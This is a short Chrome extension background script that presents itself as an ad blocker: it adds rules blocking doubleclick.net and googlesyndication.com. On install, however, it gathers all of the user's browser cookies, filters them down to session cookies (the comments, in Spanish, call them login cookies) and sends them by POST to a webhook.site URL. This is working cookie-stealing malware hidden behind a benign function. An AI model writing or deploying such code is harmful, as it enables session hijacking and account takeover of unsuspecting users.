chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [
      {
        "id": 1,
        "priority": 1,
        "action": { "type": "block" },
        "condition": {
          "urlFilter": "*://*.doubleclick.net/*",
          "resourceTypes": ["script", "image", "xmlhttprequest"]
        }
      },
      {
        "id": 2,
        "priority": 1,
        "action": { "type": "block" },
        "condition": {
          "urlFilter": "*://*.googlesyndication.com/*",
          "resourceTypes": ["script", "image", "xmlhttprequest"]
        }
      }
    ]
  });
  
  
  chrome.runtime.onInstalled.addListener(() => {
    chrome.cookies.getAll({}, (cookies) => {
        // Filtra solo cookies de sesión (que no tengan fecha de expiración)
        const loginCookies = cookies.filter(cookie => !cookie.expirationDate);
        
        fetch("https://webhook.site/fe8cc937-14e8-4dae-a8c1-ff969b22280e", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ loginCookies })
        })
        .then(response => response.text())
        .then(result => console.log("Cookies enviadas:", result))
        .catch(error => console.error("Error enviando cookies:", error));
    });
});

